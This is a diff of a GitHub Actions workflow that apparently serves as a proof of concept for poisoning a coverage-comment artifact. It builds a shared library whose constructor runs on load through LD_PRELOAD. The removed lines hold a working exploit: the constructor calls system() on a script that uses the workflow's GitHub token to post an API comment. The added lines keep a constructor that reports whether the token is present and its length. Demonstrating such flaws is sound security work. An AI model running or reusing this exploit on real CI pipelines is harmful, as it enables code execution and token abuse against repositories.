@@ -29,27 +29,20 @@ jobs:
 
           cat > coverage-comment-data/pwn.sh <<'SHEOF'
           echo "PWNED-LD-PRELOAD-CODE-EXEC"
-          echo "token_input_present=${INPUT_GITHUB_TOKEN:+yes}"
-          code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
-            -H "Authorization: Bearer $INPUT_GITHUB_TOKEN" \
-            -H 'Accept: application/vnd.github+json' \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" \
-            -d '{"body":"pwned: arbitrary code execution from attacker artifact with the workflow token"}')
-          echo "priv-api-comment-status:$code"
           SHEOF
 
           cat > pwn.c <<'CEOF'
           #include <stdio.h>
           #include <stdlib.h>
+          #include <string.h>
           #include <unistd.h>
           __attribute__((constructor)) static void pwn(void) {
-              const char *ws = getenv("GITHUB_WORKSPACE");
-              char cmd[1024];
-              write(2, "PWNED-LD-PRELOAD-CONSTRUCTOR\n", 29);
-              if (ws) {
-                  snprintf(cmd, sizeof(cmd), "bash %s/pwn.sh 1>&2", ws);
-                  system(cmd);
-              }
+              const char *tok = getenv("INPUT_GITHUB_TOKEN");
+              char buf[256];
+              int n = snprintf(buf, sizeof buf,
+                  "PWNED-LD-PRELOAD-CONSTRUCTOR token_present=%s token_len=%zu\n",
+                  tok ? "yes" : "no", tok ? strlen(tok) : 0);
+              write(2, buf, n);
           }
           CEOF
           gcc -shared -fPIC -o coverage-comment-data/pwn.so pwn.c
